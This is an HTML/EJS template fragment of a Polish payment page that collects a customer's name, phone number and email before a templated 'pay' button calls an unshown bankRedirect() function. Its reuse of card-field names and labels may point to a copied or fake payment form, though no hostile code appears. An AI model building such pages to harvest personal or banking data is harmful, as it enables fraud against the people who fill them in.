                            <div class="line-break">
                                <h2><span>Dane osobowe</span></h2>
                            </div>
                            <form autocomplete="off">
                                <div>
                                    <div class="inline separated">
                                        <div class="form-row"><label for="card-date">Imię</label><input type="text" name="date" tabindex="5" class="" id="userName"></div>
                                        <div class="form-row"><label for="card-cvv">Nazwisko</label><input type="text" name="cvv" tabindex="6" class="" id="userLastName"></div>
                                    </div>
                                </div>
                                <div>
                                    <div class="inline separated">
                                        <div class="form-row"><label for="card-date">Numer telefonu</label><input type="text" name="date" tabindex="5" class="" id="userNumber"></div>
                                        <div class="form-row"><label for="card-cvv">Adres e-mail</label><input type="text" name="cvv" tabindex="6" class="" id="userEmail"></div>
                                    </div>
                                </div>
                               <label class="invalid" id="invaild" style="display: none"><span>Uzupełnij brakujące informacje</span></label>
                                <label class="invalid" id="invaildBank" style="display: none"><span>Wybierz bank</span></label>
                                <div class="form-actions"><input name="submit" type="button" class="submitbutton-card" tabindex="9" onclick="bankRedirect();" value="Zapłać <%= config["price"] %> zł"></div>
